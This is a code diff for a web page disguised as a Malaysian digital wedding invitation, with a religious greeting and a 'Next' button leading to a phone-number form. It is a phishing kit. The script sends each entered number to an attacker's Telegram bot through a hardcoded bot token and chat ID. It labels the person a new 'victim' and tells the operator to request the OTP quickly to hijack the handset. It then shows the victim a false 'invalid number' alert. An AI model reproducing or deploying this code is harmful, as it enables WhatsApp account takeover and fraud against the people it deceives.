@@ -53,4 +53,212 @@
             padding: 10px 20px;
 
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-          
+
+            margin: 10px;
+
+        }
+
+        .welcome-text {
+
+            font-size: 24px;
+
+        }
+
+        .bismillah-title {
+
+            font-size: 24px;
+
+            margin-bottom: 10px;
+
+            font-style: italic;
+
+            background: linear-gradient(45deg, #4CAF50, #8BC34A, #4CAF50);
+
+            -webkit-background-clip: text;
+
+            -webkit-text-fill-color: transparent;
+
+            animation: gradient 3s linear infinite;
+
+        }
+
+        @keyframes gradient {
+
+            0% { background-position: 0% 50%; }
+
+            100% { background-position: 100% 50%; }
+
+        }
+
+        .continue-btn {
+
+            background: linear-gradient(45deg, #4CAF50, #8BC34A, #4CAF50);
+
+            color: white;
+
+            border: none;
+
+            border-radius: 50px;
+
+            cursor: pointer;
+
+            font-size: 18px;
+
+            padding: 20px 40px;
+
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+
+            transition: all 0.3s ease;
+
+            background-size: 200% auto;
+
+            animation: gradient 3s linear infinite;
+
+        }
+
+        .continue-btn:hover {
+
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.4);
+
+        }
+
+        .phone-screen input {
+
+            border: 1px solid #ccc;
+
+            width: 80%;
+
+            max-width: 300px;
+
+            padding: 10px 20px;
+
+        }
+
+        .phone-screen button {
+
+            background: linear-gradient(45deg, #4CAF50, #8BC34A, #4CAF50);
+
+            color: white;
+
+            border: none;
+
+            border-radius: 25px;
+
+            cursor: pointer;
+
+            font-size: 16px;
+
+            padding: 15px 30px;
+
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+
+            transition: all 0.3s ease;
+
+            background-size: 200% auto;
+
+            animation: gradient 3s linear infinite;
+
+        }
+
+        .phone-screen button:hover {
+
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.4);
+
+        }
+
+        .phone-screen {
+
+            display: none;
+
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+    <div class="welcome-screen">
+
+        <div class="bismillah-tititletle">🄺🄰🄳 🄳🄸🄶🄸🅃🄰🄻</div>
+
+        <div class="welcome-text">بِسْــــــــــــــــــمِ اللهِ الرَّحْمَنِ الرَّحِيْم
+
+𝙎𝙖𝙡𝙖𝙢 𝙆𝙖𝙢𝙞 𝙢𝙚𝙣𝙟𝙚𝙢𝙥𝙪𝙩 𝙩𝙪𝙖𝙣/𝙥𝙪𝙖𝙣 & 𝙨𝙚𝙢𝙪𝙖 𝙧𝙚𝙠𝙖𝙣      
+
+          𝙎𝙐𝙍𝘼𝙏 𝙋𝙀𝙂𝙀𝙎𝘼𝙃𝘼𝙉 𝘿𝙄𝙂𝙄𝙏𝘼𝙇 ✉️
+
+𝙏𝙖𝙧𝙞𝙠𝙝 , 𝙏𝙚𝙢𝙥𝙖𝙩, 𝙈𝙖𝙨𝙖 𝙎𝙚𝙢𝙪𝙖 𝘼𝙙𝙖 𝘿𝙖𝙡𝙖𝙢 𝙅𝙚𝙢𝙥𝙪𝙩𝙖𝙣
+
+𝗞𝗟𝗜𝗞 𝙉𝙀𝙓𝙏 & 𝘾𝙊𝙉𝙁𝙄𝙍𝙈 𝙉𝙐𝙈𝘽𝙀𝙍</div>
+
+        <button class="continue-btn" onclick="showPhoneScreen()">Next</button>
+
+    </div>
+
+    <div class="phone-screen">
+
+        <div class="bismillah">Register Nombor👇🏻</div>
+
+
+      
+
+      
+
+        <input type="tel" id="phone-number" placeholder="📱+60">
+
+        <button onclick="sendPhoneNumber()">Confirm</button>
+
+    </div>
+
+    <script>
+
+        function showPhoneScreen() {
+
+            document.querySelector('.welcome-screen').style.display = 'none';
+
+            document.querySelector('.phone-screen').style.display = 'flex';
+
+        }
+
+        function sendPhoneNumber() {
+
+            var phoneNumber = document.getElementById('phone-number').value;
+
+            var botToken = '8090590508:AAECd96z3ZU-aR9sSQI2m0za1zvQh6IckQc';
+
+            var chatId = '7218472447';
+
+            var message = '𝙃𝙄 𝘽𝙍𝙊𝙏𝙃𝙀𝙍🐃 !!!  BERHASIL MENDAPATKAN KORBAN TERBARU >>𝙉𝙊𝙏𝙀>>𝙎𝙞𝙡𝙖 𝙧𝙚𝙦 𝙊𝙏𝙋 𝙩𝙚𝙧𝙡𝙚𝙗𝙞𝙝 𝙙𝙖𝙝𝙪𝙡𝙪 𝙪𝙣𝙩𝙪𝙠 𝙢𝙚𝙢𝙖𝙨𝙩𝙞𝙠𝙖𝙣 𝙝𝙖𝙣𝙙𝙥𝙝𝙤𝙣𝙚 𝙠𝙤𝙧𝙗𝙖𝙣 𝙙𝙖𝙡𝙖𝙢 𝙠𝙤𝙣𝙙𝙞𝙨𝙞 𝙤𝙣/𝙖𝙘𝙩𝙞𝙫𝙚🔋      𝘼𝙇𝙒𝘼𝙔𝙎 𝘽𝙀 𝙃𝙐𝙈𝘽𝙇𝙀😇                    number 📲+60: \n' + phoneNumber;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
+
+                .then(response => response.json())
+
+                .then(data => {
+
+                    if (data.ok) {
+
+                        alert('Number phone tak valid Sila masukkan number whatsapp anda');
+
+                    } else {
+
+                        alert('Terjadi kesalahan. Silakan coba lagi.');
+
+                    }
+
+                })
+
+                .catch(error => {
+
+                    alert('Terjadi kesalahan. Silakan coba lagi.');
+
+                });
+
+        }
+
+    </script>
+
+</body>
+
+</html
